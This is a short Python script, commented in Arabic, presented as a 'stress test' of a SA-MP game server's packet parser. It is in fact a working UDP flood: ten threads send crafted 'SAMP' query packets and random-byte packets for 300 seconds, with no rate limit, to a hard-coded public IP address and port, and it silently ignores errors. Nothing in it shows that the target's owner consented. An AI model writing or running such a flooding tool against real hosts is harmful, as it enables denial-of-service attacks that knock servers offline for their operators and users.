import socket
import time
import random
import threading

TARGET_IP = "94.23.168.153"
TARGET_PORT = 2343
DURATION = 300  # مدة الاختبار بالثواني
THREADS = 10

def smart_stress_worker(end_time):
    client = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    # أنواع مختلفة من البايتات لاختبار استجابة معالج السيرفر لعمليات التحليل (Parsing)
    payloads = [
        # حزمة استعلام معدلة بلغة غير قياسية أو رموز وهمية
        b'SAMP' + socket.inet_aton(TARGET_IP) + int(TARGET_PORT).to_bytes(2, 'little') + b'x' * 50,
        # حزمة بيانات مبعثرة لاختبار الـ Exception Handling في السيرفر
        b'\x00\xFF\x00\xFF' + b'SAMP' + bytes([random.randint(0, 255) for _ in range(20)]),
        # استعلام متكرر برمز مختلف
        b'SAMP' + socket.inet_aton(TARGET_IP) + int(TARGET_PORT).to_bytes(2, 'little') + b'p'
    ]
    
    count = 0
    while time.time() < end_time:
        try:
            # اختيار نمط عشوائي من الحزم لاختبار استجابة الـ Parser
            payload = random.choice(payloads)
            client.sendto(payload, (TARGET_IP, TARGET_PORT))
            count += 1
        except Exception:
            pass
            
    client.close()

def run_test():
    end_time = time.time() + DURATION
    print(f"جاري بدء اختبار تحليل الحزم على {TARGET_IP}:{TARGET_PORT}...")
    
    threads = []
    for _ in range(THREADS):
        t = threading.Thread(target=smart_stress_worker, args=(end_time,))
        threads.append(t)
        t.start()
        
    for t in threads:
        t.join()
        
    print("انتهى الاختبار بنجاح.")

if __name__ == "__main__":
    run_test()
